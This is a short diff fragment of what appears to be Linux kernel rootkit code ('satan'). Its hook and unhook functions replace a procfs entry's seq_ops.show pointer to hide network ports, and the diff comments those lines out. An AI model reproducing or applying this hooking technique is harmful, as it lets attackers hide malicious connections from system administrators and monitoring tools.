@@ -227,8 +227,8 @@ static int satan_port_hook_seq_show(void)
         }
 
         afinfo = PDE_DATA(filp->f_path.dentry->d_inode);
-        real_seq_show = afinfo->seq_ops.show;
-        afinfo->seq_ops.show = satan_seq_show;
+        //real_seq_show = afinfo->seq_ops.show;
+        //afinfo->seq_ops.show = satan_seq_show;
 
 out:
         if (filp)
@@ -253,8 +253,8 @@ static int satan_port_unhook_seq_show(void)
         }
 
         afinfo = PDE_DATA(filp->f_path.dentry->d_inode);
-        afinfo->seq_ops.show = real_seq_show;
-        real_seq_show = NULL;
+        //afinfo->seq_ops.show = real_seq_show;
+        //real_seq_show = NULL;
 
 out:
         if (filp)
